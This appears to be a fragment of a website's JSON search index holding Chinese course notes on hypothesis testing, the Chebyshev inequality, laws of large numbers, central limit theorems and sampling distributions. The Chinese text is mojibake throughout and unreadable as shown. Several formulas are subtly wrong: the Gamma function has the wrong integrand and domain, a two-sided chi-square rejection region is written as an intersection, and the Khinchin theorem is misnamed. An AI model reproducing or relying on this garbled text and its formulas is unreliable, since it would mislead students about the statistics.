u_{\\alpha/2}$$\nå¦‚æœç»Ÿè®¡è§‚å¯Ÿå€¼ $$|Z| \\ge u_{\\alpha/2}$$ï¼Œåˆ™æ‹’ç»åŸå‡è®¾ï¼›å¦åˆ™æ¥æ”¶åŸå‡è®¾ã€‚\n1.2 æ–¹å·®æœªçŸ¥ $$\\rightarrow$$ T æ£€éªŒæ³• #   æ€»ä½“ $$X \\sim N(\\mu , \\sigma^2)$$ï¼Œ$$\\sigma$$ æœªçŸ¥ï¼Œå‡è®¾ $$H_0: \\mu = \\mu_0; H_1: \\mu \\ne \\mu_0$$\n æ„é€  T ç»Ÿè®¡é‡ $${\\displaystyle T = \\frac{\\overline{X} - \\mu_0}{S/\\sqrt{n}} \\sim t(n-1)}$$\nç”± $${\\displaystyle P\\Big(\\mid \\frac{\\overline{X} - \\mu_0}{S/\\sqrt{n}} \\mid \\ge t_{\\alpha/2}(n-1)\\Big) = \\alpha}$$ï¼Œç¡®å®šæ‹’ç»åŸŸ $$|T| \\ge t_{\\alpha/2}(n-1)$$\nå¦‚æœç»Ÿè®¡è§‚å¯Ÿå€¼ $$|T| \\ge t_{\\alpha/2}$$ï¼Œåˆ™æ‹’ç»åŸå‡è®¾ï¼›å¦åˆ™æ¥æ”¶åŸå‡è®¾ã€‚\n2. ä¸¤ä¸ªæ­£æ€åˆ†å¸ƒæ€»ä½“çš„å‡å€¼æ£€éªŒ #  2.1 æ–¹å·®å·²çŸ¥ï¼Œæ£€éªŒå‡å€¼ç›¸ç­‰ $$\\rightarrow$$ Z åŒä¾§æ£€éªŒæ³• #   å·²çŸ¥ $$X \\sim N(\\mu_X , \\sigma_X^2), Y \\sim N(\\mu_Y , \\sigma_Y^2)$$ï¼Œå·²çŸ¥ $$\\sigma_X^2, \\sigma_Y^2$$ï¼Œæ£€éªŒ $$H_0: \\mu_X = \\mu_Y$$\n è®¾ $$X_1, X_2, \u0026hellip;, X_{n_1}$$ æ˜¯ X çš„ä¸€ä¸ªæ ·æœ¬ï¼Œ$$Y_1, Y_2, \u0026hellip;, Y_{n_2}$$ æ˜¯ Y çš„ä¸€ä¸ªæ ·æœ¬ï¼Œ\nåˆ™å½“ $$H_0$$ æˆç«‹æ—¶æœ‰ï¼š$$\\displaystyle Z = \\frac{\\overline{X} - \\overline{Y}}{\\sqrt{\\sigma_X^2/n_1 + \\sigma_Y^2/n_2}} \\sim N(0,1)$$ï¼Œ\næ•…å¯¹ç»™å®šçš„æ£€éªŒæ°´å¹³ $$\\alpha$$ï¼Œå¾— $$H_0$$ çš„æ‹’ç»åŸŸä¸ºï¼š$$\\displaystyle \\Bigg| \\frac{\\overline{X} - \\overline{Y}}{\\sqrt{\\sigma_X^2/n_1 + \\sigma_Y^2/n_2}} \\Bigg| \u0026gt; z_{\\alpha/2}$$\n2.2 æ–¹å·®æœªçŸ¥ï¼Œä½†ä¸¤ä¸ªæ€»ä½“æ–¹å·®ç›¸ç­‰ï¼Œæ£€éªŒå‡å€¼ç›¸ç­‰ #   å·²çŸ¥ $$X \\sim N(\\mu_X , \\sigma_X^2), Y \\sim N(\\mu_Y , \\sigma_Y^2)$$ï¼Œ$$\\sigma_X^2, \\sigma_Y^2$$æœªçŸ¥ï¼Œå·²çŸ¥ $$\\sigma_X^2 = \\sigma_Y^2$$ï¼Œæ£€éªŒ $$H_0: \\mu_X = \\mu_Y$$\n è®¾ $$X_1, X_2, \u0026hellip;, X_{n_1}$$ æ˜¯ X çš„ä¸€ä¸ªæ ·æœ¬ï¼Œ$$Y_1, Y_2, \u0026hellip;, Y_{n_2}$$ æ˜¯ Y çš„ä¸€ä¸ªæ ·æœ¬ï¼Œ\nåˆ™å½“ $$H_0$$ æˆç«‹æ—¶æœ‰ï¼š$$\\displaystyle T = \\frac{\\overline{X} - \\overline{Y} - (\\mu_X - \\mu_Y)}{\\sqrt{\\displaystyle \\frac{S_X^2(n_1-1) + S_Y^2(n_2 - 1)}{n_1 + n_2 - 2}} \\sqrt{\\displaystyle \\frac{1}{n_1} + \\frac{1}{n_2}}} \\sim t(n_1 + n_2 -2)$$ï¼Œ\næ•…å¯¹ç»™å®šçš„æ£€éªŒæ°´å¹³ $$\\alpha$$ï¼Œå¾— $$H_0$$ çš„æ‹’ç»åŸŸä¸ºï¼š$$\\displaystyle \\Bigg| \\frac{\\overline{X} - \\overline{Y} - (\\mu_X - \\mu_Y)}{\\sqrt{\\displaystyle \\frac{S_X^2(n_1-1) + S_Y^2(n_2 - 1)}{n_1 + n_2 - 2}} \\sqrt{\\displaystyle \\frac{1}{n_1} + \\frac{1}{n_2}}} \\Bigg| \u0026gt; t_{\\alpha/2}(n_1 + n_2 -2)$$\næ­£æ€åˆ†å¸ƒæ€»ä½“æ–¹å·®çš„å‡è®¾æ£€éªŒ #  1. å•ä¸ªæ­£æ€åˆ†å¸ƒçš„æ–¹å·®æ£€éªŒ #  1.1 å‡å€¼å·²çŸ¥ #   æ€»ä½“ $$X \\sim N(\\mu , \\sigma^2)$$ï¼Œ$$\\mu$$ å·²çŸ¥ï¼Œå‡è®¾ $$H_0: \\sigma^2 = \\sigma^2_0; H_1: \\sigma^2 \\ne \\sigma^2_0$$\n æ„é€ ç»Ÿè®¡é‡ $$\\displaystyle \\chi^2 = \\frac{\\displaystyle \\sum_{i=1}^n(X_i - \\mu)^2}{\\sigma^2_0} \\sim \\chi^2(n)$$\n1.2 å‡å€¼æœªçŸ¥ï¼ŒåŒè¾¹æ£€éªŒ #   æ€»ä½“ $$X \\sim N(\\mu , \\sigma^2)$$ï¼Œ$$\\mu$$ æœªçŸ¥ï¼Œå‡è®¾ $$H_0: \\sigma^2 = \\sigma^2_0; H_1: \\sigma^2 \\ne \\sigma^2_0$$\n æ„é€ ç»Ÿè®¡é‡ $$\\displaystyle \\chi^2 = \\frac{(n-1)S^2}{\\sigma^2_0} \\sim \\chi^2(n-1)$$\nç”± $$\\displaystyle P(\\chi^2 \\le \\chi^2_{1 - \\frac{\\alpha}{2}}(n-1)) = \\frac{\\alpha}{2}, \\displaystyle P(\\chi^2 \\le \\chi^2_{\\frac{\\alpha}{2}}(n-1)) = \\frac{\\alpha}{2}$$ ç¡®å®šæ‹’ç»åŸŸ $$[0, \\chi^2_{1 - \\frac{\\alpha}{2}}(n-1)] \\cap [\\chi^2_{\\frac{\\alpha}{2}}(n-1), +\\infty]$$\nè¿›è¡Œç»Ÿè®¡å†³ç­–ã€‚\n1.3 å‡å€¼æœªçŸ¥ï¼Œå•è¾¹æ£€éªŒ #   æ€»ä½“ $$X \\sim N(\\mu , \\sigma^2)$$ï¼Œ$$\\mu$$ æœªçŸ¥ï¼Œå‡è®¾ $$H_0: \\sigma^2 \\le \\sigma^2_0; H_1: \\sigma^2 \\gt \\sigma^2_0$$\n æ„é€ ç»Ÿè®¡é‡ $$\\displaystyle \\chi^2 = \\frac{(n-1)S^2}{\\sigma^2_0} \\sim \\chi^2(n-1)$$\né€šè¿‡ $$P(\\chi^2 \\ge \\chi^2_{\\alpha}) = \\alpha$$ ç¡®å®šæ‹’ç»åŸŸ $$[\\chi^2_{\\alpha}, +\\infty)$$\n2. ä¸¤ä¸ªæ­£æ€åˆ†å¸ƒçš„æ–¹å·®æ£€éªŒ #  2.1 å‡å€¼æœªçŸ¥ï¼ŒåŒè¾¹æ£€éªŒ #   å·²çŸ¥ $$X \\sim N(\\mu_X , \\sigma_X^2), Y \\sim N(\\mu_Y , \\sigma_Y^2)$$ï¼Œ$$\\mu_X, \\mu_Y$$æœªçŸ¥ï¼Œæ£€éªŒ $$H_0: \\sigma^2_X = \\sigma^2_Y$$\n è‹¥å½“ $$H_0$$ æˆç«‹æ—¶ï¼Œåˆ™æœ‰ $$\\displaystyle F = \\frac{S_X^2}{S_Y^2} \\sim F(n_1 - 1, n_2 - 1)$$\nå¯¹äºç»™å®šçš„æ£€éªŒæ°´å¹³ $$\\alpha $$ï¼Œå­˜åœ¨ä¸´ç•Œå€¼ $$C_1$$ å’Œ $$C_2$$ï¼Œä½¿å¾—ï¼š$$P(F \\le C_2 \\cup F \\ge C_1) = \\alpha$$ï¼Œä¸ºäº†æ–¹ä¾¿è®¡ç®—å–ï¼š$$\\displaystyle P(F \\ge C_1) = P(F \\le C_2) = \\frac{\\alpha}{2}$$ï¼Œ\näºæ˜¯å¯ä»¥ç¡®å®šæ‹’ç»åŸŸ $$\\displaystyle F \u0026lt; F_{1 - \\frac{\\alpha}{2}}(n_1 - 1, n_2 - 1) \\or F \u0026gt; F_{\\frac{\\alpha}{2}}(n_1 - 1, n_2 - 1)$$\n2.2 å‡å€¼æœªçŸ¥ï¼Œæ–¹å·®å•è¾¹æ£€æµ‹ #   å·²çŸ¥ $$X \\sim N(\\mu_X , \\sigma_X^2), Y \\sim N(\\mu_Y , \\sigma_Y^2)$$ï¼Œ$$\\mu_X, \\mu_Y$$æœªçŸ¥ï¼Œæ£€éªŒ $$H_0: \\sigma^2_X \\le \\sigma^2_Y$$\n è‹¥å½“ $$H_0$$ æˆç«‹æ—¶ï¼Œåˆ™æœ‰ $$\\displaystyle F = \\frac{S_X^2}{S_Y^2} \\sim F(n_1 - 1, n_2 - 1)$$\næ‹’ç»åŸŸ $$F \u0026gt; F_{\\alpha}(n_1 -1, n_2 - 1)$$\næ€»ç»“ #      å‚æ•° å‡å€¼æ£€æµ‹ æ–¹å·®æ£€éªŒ     å•ä¸ªæ­£æ€åˆ†å¸ƒ å·²çŸ¥ Z-æ£€éªŒï¼š$$\\displaystyle \\frac{\\overline{X} - \\mu_0}{\\sigma/\\sqrt{n}} \\sim N(0,1)$$ $$\\chi^2$$-æ£€éªŒï¼š$$\\displaystyle \\frac{\\displaystyle \\sum_{i=1}^n(X_i - \\mu)^2}{\\sigma^2_0} \\sim \\chi^2(n)$$    æœªçŸ¥ T-æ£€éªŒï¼š$${\\displaystyle \\frac{\\overline{X} - \\mu_0}{S/\\sqrt{n}} \\sim t(n-1)}$$ $$\\chi^2$$-æ£€éªŒï¼š$$\\displaystyle \\frac{(n-1)S^2}{\\sigma^2_0} \\sim \\chi^2(n-1)$$   ä¸¤ä¸ªæ­£æ€åˆ†å¸ƒ å·²çŸ¥ Z-æ£€éªŒï¼š$$\\displaystyle \\frac{\\overline{X} - \\overline{Y}}{\\sqrt{\\sigma_X^2/n_1 + \\sigma_Y^2/n_2}} \\sim N(0,1)$$ ç»è¿‡å˜æ¢å¯ä»¥ç­‰ä»·äºæœªçŸ¥ä¸”ç›¸ç­‰    æœªçŸ¥ T-æ£€éªŒï¼š$$\\displaystyle \\frac{U_w}{S_w} \\sim t(n_1 + n_2 -2)$$\n$$\\displaystyle U_w = \\frac{\\overline{X} - \\overline{Y} - (\\mu_X - \\mu_Y)}{\\sqrt{\\displaystyle \\frac{1}{n_1} + \\frac{1}{n_2}}}$$\n$$\\displaystyle S_w^2 = \\frac{S_X^2(n_1-1) + S_Y^2(n_2 - 1)}{n_1 + n_2 - 2}$$ F-æ£€éªŒï¼š$$\\displaystyle \\frac{S_X^2}{S_Y^2} \\sim F(n_1 - 1, n_2 - 1)$$    "},{"id":333,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%88%87%E6%AF%94%E9%9B%AA%E5%A4%AB%E4%B8%8D%E7%AD%89%E5%BC%8F/","title":"åˆ‡æ¯”é›ªå¤«ä¸ç­‰å¼","section":"æ¦‚ç‡è®º","content":"çŸ¥ä¹ï¼šhttps://www.zhihu.com/question/27821324\né©¬å°”ç§‘å¤«ä¸ç­‰å¼ï¼š\n $${\\displaystyle P(X \\ge a) \\le \\frac{E(X)}{a}, where\\ X \\ge a}$$  åˆ‡æ¯”é›ªå¤«ä¸ç­‰å¼ï¼š\n $${\\displaystyle P(|X-\\mu| \\ge k\\sigma) \\le \\frac{1}{k^2}}$$  å‰è€…å¸¦å…¥ $$X \\Rightarrow |X-\\mu|$$ ï¼Œå¹³æ–¹ï¼Œä»¤ $${\\displaystyle k = \\frac{a}{\\sigma}}$$ å¾—åˆ°åè€…ã€‚\nåˆ‡æ¯”é›ªå¤«ä¸ç­‰å¼é¢„æµ‹çš„å‡†ç¡®ç‡è¦è¿œè¿œé«˜äºé©¬å°”ç§‘å¤«ä¸ç­‰å¼ã€‚\n"},{"id":334,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%A4%A7%E6%95%B0%E5%AE%9A%E7%90%86%E5%92%8C%E4%B8%AD%E5%BF%83%E6%9E%81%E9%99%90%E5%AE%9A%E7%90%86/","title":"å¤§æ•°å®šç†å’Œä¸­å¿ƒæé™å®šç†","section":"æ¦‚ç‡è®º","content":"å¤§æ•°å®šç† #  ä¾æ¦‚ç‡æ”¶æ•› #  å®šä¹‰ #  å¦‚æœå¯¹äºä»»ä½• $$\\epsilon \u0026gt; 0$$ï¼Œéƒ½æœ‰ï¼š\n$${\\displaystyle \\lim_{n \\to \\infin} P(|\\xi_n - \\xi| \\geq \\epsilon) = 0}$$\né‚£ä¹ˆæˆ‘ä»¬ç§°éšæœºå˜é‡åºåˆ— $${\\displaystyle{ \\xi_n, n \\in \\mathbb{N}}}$$ ä¾æ¦‚ç‡æ”¶æ•›åˆ°éšæœºå˜é‡ $$\\xi$$ï¼Œè®°ä½œ $${\\displaystyle \\xi_n \\xrightarrow{p} \\xi}$$\næ€§è´¨ #  è®¾ $$X_n \\xrightarrow{P} a, Y_n \\xrightarrow{P} b $$ï¼Œä¸”å‡½æ•° $$g(x,y)$$ åœ¨ç‚¹ $$(a, b)$$ è¿ç»­ï¼Œåˆ™ç§°ï¼š$$g(X_n, Y_n) \\xrightarrow{P} g(a,b)$$\nä¾æ¦‚ç‡æ”¶æ•›æ¯”é«˜ç­‰æ•°å­¦ä¸­çš„æ™®é€šæ„ä¹‰ä¸‹çš„æ”¶æ•›å¼±äº›ï¼Œå®ƒå…·æœ‰æŸç§ä¸ç¡®å®šæ€§ï¼š\n å½“ n å……åˆ†å¤§æ—¶ï¼Œäº‹ä»¶ $$|X_n - a| \\lt \\epsilon$$ çš„æ¦‚ç‡éå¸¸å¤§ï¼Œæ¥è¿‘äº 1ï¼Œä½†æ˜¯å¹¶ä¸æ’é™¤ $$|X_n - a| \\ge \\epsilon$$ å‘ç”Ÿçš„å¯èƒ½æ€§ã€‚  ä¸€ã€åˆ‡æ¯”é›ªå¤« Chebyshev å¤§æ•°å®šç† #  è®¾ $$X_1, X_2, \u0026hellip;, X_n, \u0026hellip;$$ ç›¸äº’ç‹¬ç«‹ï¼Œä¸”å…·æœ‰ç›¸åŒçš„æ•°å­¦æœŸæœ›å’Œæ–¹å·®ï¼š$$E(X_k) = \\mu, D(X_k) = \\sigma^2, k = 1,2\u0026hellip;$$\nåˆ™ï¼šå¯¹å‰ n ä¸ªéšæœºå˜é‡çš„ç®—æœ¯å¹³å‡æœ‰ $${\\displaystyle \\overline{X} = \\frac{1}{n} \\Sigma^{n}_{k=1} X_k \\xrightarrow{p} \\mu }$$\nå«ä¹‰ï¼šç®—æœ¯å¹³å‡å€¼ä¾æ¦‚ç‡æ”¶æ•›æ„ä¹‰ä¸‹é€¼è¿‘æŸä¸€å¸¸æ•°\näºŒã€ä¼¯åŠªåˆ© Bernoulli å¤§æ•°å®šç† #  è®¾ $$n_A$$ æ˜¯ n æ¬¡ç‹¬ç«‹é‡å¤è¯•éªŒä¸­äº‹ä»¶ A å‘ç”Ÿçš„æ¬¡æ•°ï¼Œ$$p$$ æ˜¯äº‹ä»¶ A åœ¨æ¯æ¬¡è¯•éªŒä¸­å‘ç”Ÿçš„æ¦‚ç‡ï¼Œ\nåˆ™ $$\\displaystyle \\forall \\epsilon\u0026gt; 0, \\lim_{n \\rightarrow \\infty} P\\Big(\\mid \\frac{n_A}{n} - p \\mid \\lt \\epsilon\\Big) = 1$$\né‡è¦æ„ä¹‰ï¼š\n ä»ç†è®ºä¸Šè¯æ˜äº†é¢‘ç‡å…·æœ‰ç¨³å®šæ€§ æä¾›äº†é€šè¿‡è¯•éªŒæ¥ç¡®å®šäº‹ä»¶æ¦‚ç‡çš„æ–¹æ³•ï¼š$$\\displaystyle \\frac{n_A}{n} \\approx p = P(A)$$ å®é™…ä¸­æ¦‚ç‡å¾ˆå°çš„éšæœºäº‹ä»¶åœ¨ä¸ªåˆ«è¯•éªŒä¸­æ˜¯ä¸å¯èƒ½å‘ç”Ÿçš„ã€‚  ä¸‰ã€è¾›é’¦ Wiener-khinchin å¤§æ•°å®šç† #  è®¾éšæœºå˜é‡ $$X_1, X_2, \u0026hellip;, X_n, \u0026hellip;$$ ç‹¬ç«‹åŒåˆ†å¸ƒï¼Œå…·æœ‰ç›¸åŒçš„æ•°å­¦æœŸæœ› $$E(X_i) = \\mu, i = 1,2,\u0026hellip;$$ï¼Œ\nåˆ™ï¼š$$\\displaystyle \\forall \\epsilon \u0026gt; 0, \\lim_{n \\rightarrow \\infty} P(|\\frac{1}{n}\\sum_{i=1}^nX_i -\\mu| \u0026lt; \\epsilon) = 1$$\nä¸­å¿ƒæé™å®šç† #  ä¸€ã€ç‹¬ç«‹åŒåˆ†å¸ƒä¸‹çš„ä¸­å¿ƒæé™å®šç† #  è®¾éšæœºå˜é‡ $$X_1, X_2, \u0026hellip;, X_n, \u0026hellip;$$ ç›¸äº’ç‹¬ç«‹ï¼Œæœä»åŒä¸€åˆ†å¸ƒï¼Œä¸”å…·æœ‰ç›¸åŒçš„æ•°å­¦æœŸæœ›å’Œæ–¹å·®ï¼š$$E(X_k) = \\mu, D(X_k) = \\sigma_k^2, k \\in {1,2,\u0026hellip;}$$ï¼Œ\nåˆ™éšæœºå˜é‡ä¹‹å’Œ $$\\displaystyle \\sum_{k=1}^{n} X_k$$ çš„æ ‡å‡†åŒ–å˜é‡ $$\\displaystyle Y_n = \\frac{\\displaystyle \\sum_{k=1}^{n} X_k - E(\\sum_{k=1}^n X_k)}{\\displaystyle \\sqrt{D(\\sum_{k=1}^n X_k)}} = \\frac{\\displaystyle \\sum_{k=1}^n X_k - n \\mu}{\\displaystyle \\sqrt{n}\\sigma}$$ çš„åˆ†å¸ƒå‡½æ•° $$F_n(x) $$ å¯¹äºä»»æ„ x æ»¡è¶³ï¼š$$\\displaystyle \\lim_{n \\rightarrow \\infty} F_n(x) = \\phi(x)$$\nå®šç†è¡¨æ˜ï¼š\n  ç‹¬ç«‹åŒåˆ†å¸ƒéšæœºå˜é‡ä¹‹å’Œ $$\\displaystyle \\sum_{k=1}^{n} X_k $$ï¼Œå½“ n å……åˆ†å¤§æ—¶ï¼Œæœ‰ $$\\displaystyle \\sum_{k=1}^{n} X_k \\overset{similarly}{\\sim} N(n \\mu, n \\sigma^2)$$\n  ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¾ˆéš¾æ±‚å‡º $$\\displaystyle \\sum_{k=1}^{n} X_k $$ åˆ†å¸ƒçš„ç¡®åˆ‡å½¢å¼ï¼Œä½†å½“ n å¾ˆå¤§æ—¶ï¼Œå¯ä»¥æ±‚å‡ºè¿‘ä¼¼åˆ†å¸ƒã€‚\n  æ— è®ºéšæœºå˜é‡åºåˆ—æœä»ä½•ç§åˆ†å¸ƒï¼Œåªè¦æœŸæœ›å’Œæ–¹å·®æœ‰é™ï¼Œæ€»å’Œæ ‡å‡†åŒ–åï¼Œä»¥æ ‡å‡†æ­£æ€åˆ†å¸ƒä¸ºæé™ã€‚\n  äºŒã€æé›…æ™®è¯ºå¤« Lyapunov å®šç† #  è®¾éšæœºå˜é‡ $$X_1, X_2, \u0026hellip;, X_n, \u0026hellip;$$ ç›¸äº’ç‹¬ç«‹ï¼Œä»–ä»¬å…·æœ‰ç›¸åŒçš„æ•°å­¦æœŸæœ›å’Œæ–¹å·®ï¼š$$E(X_k) = \\mu, D(X_k) = \\sigma_k^2, k \\in {1,2,\u0026hellip;}$$ï¼Œè®° $$\\displaystyle B_n^2 = \\sum_{k=1}^n \\sigma_k^2$$\nä¸‰ã€æ££è«ä½›ï¼æ‹‰æ™®æ‹‰æ–¯ De Moivre-Laplace å®šç† #  è®¾éšæœºå˜é‡ $$\\eta_n$$ æœä»å‚æ•°ä¸º $$n, p (0 \u0026lt; p \u0026lt; 1)$$ çš„äºŒé¡¹åˆ†å¸ƒï¼Œåˆ™å¯¹äºä»»æ„çš„ xï¼Œæœ‰ï¼š\n$$\\displaystyle \\lim_{n \\rightarrow \\infty} P(\\frac{\\eta_n - np}{\\sqrt{np(1-p)}} \\le x) = \\phi(x)$$\nå®šç†è¡¨æ˜ï¼š\n å½“ n å¾ˆå¤§æ—¶ï¼Œå˜é‡ $$\\eta_n$$ çš„åˆ†å¸ƒï¼Œè¿‘ä¼¼æ­£æ€åˆ†å¸ƒ $$N(np,np(1-p))$$  "},{"id":335,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%A0%B7%E6%9C%AC%E5%8F%8A%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/","title":"æ ·æœ¬åŠæŠ½æ ·åˆ†å¸ƒ","section":"æ¦‚ç‡è®º","content":"æ ·æœ¬åŠæŠ½æ ·åˆ†å¸ƒ #  æ€»ä½“ä¸æ ·æœ¬ #  æ ·æœ¬ï¼šn ä¸ªä¸æ€»ä½“åŒåˆ†å¸ƒçš„éšæœºå˜é‡ã€‚\nç®€å•éšæœºæ ·æœ¬ï¼š\n ä»£è¡¨æ€§ï¼šæ ·æœ¬ä¸­çš„æ¯ä¸€ä¸ªä¸æ‰€è€ƒæŸ¥çš„æ€»ä½“æœ‰ç›¸åŒçš„åˆ†å¸ƒï¼› ç‹¬ç«‹æ€§ï¼šæ ·æœ¬ä¸­çš„æ¯ä¸€ä¸ªéƒ½æ˜¯ç›¸äº’ç‹¬ç«‹çš„éšæœºå˜é‡ã€‚  ç»Ÿè®¡é‡ #  å®šä¹‰ï¼š\n è®¾ $$X_1, X_2, \u0026hellip;, X_n$$ æ˜¯æ¥è‡ªæ€»ä½“ X çš„ä¸€ä¸ªæ ·æœ¬ï¼Œ$$g(X_1, X_2, \u0026hellip;, X_n)$$ æ˜¯ $$X_1, X_2, \u0026hellip;, X_n$$ çš„å‡½æ•°ï¼Œè‹¥ g ä¸­ä¸å«ä»»ä½•å‚æ•°ï¼Œåˆ™ $$g(X_1, X_2, \u0026hellip;, X_n)$$ ç§°æ˜¯ä¸€ä¸ªç»Ÿè®¡é‡ã€‚  å‡ ä¸ªé‡è¦çš„ç»Ÿè®¡é‡ï¼š\n æ ·æœ¬å‡å€¼ï¼š$${\\displaystyle \\overline{X} = \\frac{1}{n}\\sum_{i=1}^n X_i }$$ æ ·æœ¬æ–¹å·®ï¼š$${\\displaystyle S^2 = \\frac{1}{n-1}\\sum_{i=1}^n (X_i - \\overline{X})^2 = \\frac{1}{n-1}\\Big(\\sum_{i=1}^nX_i^2 - n \\overline{X}^2\\Big)} $$  $${\\displaystyle E(S^2) = \\frac{1}{n-1}\\Big[\\sum_{i=1}^n(\\sigma^2 + \\mu^2) - n(\\frac{\\sigma^2}{n} + \\mu^2)\\Big] = \\sigma^2 }$$   æ ·æœ¬ k é˜¶åŸç‚¹çŸ©ï¼š$${\\displaystyle A_k = \\frac{1}{n}\\sum_{i=1}^n X_i^k }$$ æ ·æœ¬ k é˜¶ä¸­å¿ƒçŸ©ï¼š$${\\displaystyle B_k = \\frac{1}{n}\\sum_{i=1}^n (X_i - \\overline{X})^k }$$  ç»éªŒåˆ†å¸ƒå‡½æ•° #  è®¾ $$X_1, X_2, \u0026hellip;, X_n$$ æ˜¯æ€»ä½“ $$F$$ çš„æ ·æœ¬ï¼Œç”¨ $$s(x), |x| \u0026lt; \\infty$$ è¡¨ç¤º $$X_1, X_2, \u0026hellip;, X_n$$ ä¸­ä¸å¤§äº $$x$$ çš„éšæœºå˜é‡çš„ä¸ªæ•°ã€‚\nå®šä¹‰ç»éªŒåˆ†å¸ƒå‡½æ•°ä¸º $${\\displaystyle F_n(x) = \\frac{1}{n} s(x), -\\infty \u0026lt; x \u0026lt; +\\infty}$$\næŠ½æ ·åˆ†å¸ƒ #  ç»Ÿè®¡é‡æ˜¯æ ·æœ¬çš„å‡½æ•°ï¼Œå®ƒæ˜¯ä¸€ä¸ªéšæœºå˜é‡ï¼Œç»Ÿè®¡é‡çš„åˆ†å¸ƒç§°ä¸ºæŠ½æ ·åˆ†å¸ƒã€‚\n$\\chi^2$ åˆ†å¸ƒ #  å®šä¹‰ï¼š\n è®¾ $$X_1, X_2, \u0026hellip;, X_n$$ ç›¸äº’ç‹¬ç«‹ï¼Œéƒ½æœä»æ­£æ€åˆ†å¸ƒ $$N(0,1)$$ï¼Œåˆ™ç§°éšæœºå˜é‡ï¼š$$\\chi^2 = X_1^2 + X_2^2 + \u0026hellip; + X_n^2$$ æ‰€æœä»çš„åˆ†å¸ƒä¸ºè‡ªç”±åº¦ä¸º n çš„ $$\\chi^2$$ åˆ†å¸ƒã€‚è®°ä½œ $$\\chi^2 \\sim \\chi^2(n)$$ã€‚  å¯†åº¦å‡½æ•°ï¼š\n$$\\displaystyle f(x) = \\begin{cases} {\\displaystyle \\frac{1}{2^{n/2}\\Gamma(n/2)} x^{\\frac{n}{2} - 1}e^{- \\frac{x}{2}} }\u0026amp;, x \\ge 0 \\ 0\u0026amp;, x \u0026lt; 0 \\end{cases}$$\nå…¶ä¸­ï¼š$${\\displaystyle \\Gamma(x) = \\int_0^{\\infty} e^{-t} x^{x-1}dt, x \u0026lt; 0}$$\næ€§è´¨ï¼š\n  è®¾ $$X_1 \\sim \\chi^2(n_1), X_2 \\sim \\chi^2(n_2)$$ï¼Œä¸” $$X_1, X_2$$ ç›¸äº’ç‹¬ç«‹ï¼Œåˆ™æœ‰ï¼š$$X_1 + X_2 \\sim \\chi^2(n_1 + n_2)$$ï¼Œè¿™ä¸ªæ€§è´¨å« $$\\chi^2$$ åˆ†å¸ƒçš„å¯åŠ æ€§ã€‚\n  è‹¥ $$\\chi^2 \\sim \\chi^2(n)$$ï¼Œåˆ™å½“ n å……åˆ†å¤§æ—¶ï¼Œ$${\\displaystyle \\frac{X-n}{\\sqrt{2n}} \\sim N(0, 1)}$$\n  è‹¥ $$\\chi^2 \\sim \\chi^2(n)$$ï¼Œåˆ™ $$E(X) = n, D(X) = 2n$$\n  $$\\chi^2$$ åˆ†å¸ƒçš„åˆ†ä½ç‚¹ï¼š\n å¯¹äºç»™å®šçš„æ­£æ•° $$\\alpha, 0 \u0026lt; \\alpha \u0026lt; 1$$ï¼Œç§°æ»¡è¶³æ¡ä»¶ $$\\displaystyle P(\\chi^2 \u0026gt; \\chi^2_{\\alpha}(n)) = \\int_{\\chi^2_{\\alpha}(n)}^{\\infty} f(y) dy = \\alpha$$ çš„ç‚¹ $$\\chi^2_{\\alpha}(n)$$ ä¸º $$\\chi^2(n)$$ åˆ†å¸ƒä¸Šçš„ $$\\alpha$$ åˆ†ä½ç‚¹ã€‚  t åˆ†å¸ƒ #  å®šä¹‰ï¼š\n è®¾ $$X \\sim N(0,1), Y \\sim \\chi^2(n)$$ï¼Œä¸” X ä¸ Y ç›¸äº’ç‹¬ç«‹ï¼Œåˆ™ç§°å˜é‡ï¼š$$\\displaystyle t = \\frac{X}{\\sqrt{Y/n}}$$ æ‰€æœä»çš„åˆ†å¸ƒä¸ºè‡ªç”±åº¦ä¸º n çš„ t åˆ†å¸ƒã€‚è®°ä¸º $$t \\sim t(n)$$ï¼Œt åˆ†å¸ƒåˆè¢«ç§°ä¸ºå­¦ç”Ÿæ°åˆ†å¸ƒã€‚  æ¦‚ç‡å¯†åº¦å‡½æ•°ï¼š\n$${\\displaystyle h(t) = \\frac{\\Gamma[(n+1)/2]}{\\Gamma(n/2)\\sqrt{n \\pi}} (1 + \\frac{t^2}{n})^{-\\frac{n+1}{2}}}, -\\infty \u0026lt; t \u0026lt; +\\infty$$\næ€§è´¨ï¼š\n  è‹¥ $$t \\sim t(n)$$ï¼Œ$$E(t) = 0, D(t) = n/(n-2), n \u0026gt; 2$$\n  å½“ n å……åˆ†å¤§æ—¶ï¼Œ$$\\displaystyle t \\overset{similarly}{\\sim} N(0,1)$$\n  t åˆ†å¸ƒçš„åˆ†ä½ç‚¹ï¼š\n å¯¹äºç»™å®šçš„æ­£æ•° $$\\alpha, 0 \u0026lt; \\alpha \u0026lt; 1$$ï¼Œç§°æ»¡è¶³æ¡ä»¶ $$\\displaystyle P(t \u0026gt; t_{\\alpha}(n)) = \\int_{t_{\\alpha}(n)}^{\\infty} h(t) dy = \\alpha$$ çš„ç‚¹ $$t_{\\alpha}(n)$$ ä¸º $$t(n)$$ åˆ†å¸ƒä¸Šçš„ $$\\alpha$$ åˆ†ä½ç‚¹ã€‚  F åˆ†å¸ƒ #  å®šä¹‰ï¼š\n è®¾ $$U \\sim \\chi^2(n_1), V \\sim \\chi^2(n_2)$$ï¼ŒU ä¸ V ç›¸äº’ç‹¬ç«‹ï¼Œåˆ™ç§°éšæœºå˜é‡ $$\\displaystyle F = \\frac{U/n_1}{V/n_2}$$ æœä»è‡ªç”±åº¦ä¸º $$n_1$$ åŠ $$n_2$$ çš„ F åˆ†å¸ƒï¼Œ$$n_1$$ ç§°ä¸ºç¬¬ä¸€è‡ªç”±åº¦ï¼Œ$$n_2$$ ç§°ä¸ºç¬¬äºŒè‡ªç”±åº¦ï¼Œè®°ä½œ $$F \\sim F(n_1, n_2)$$  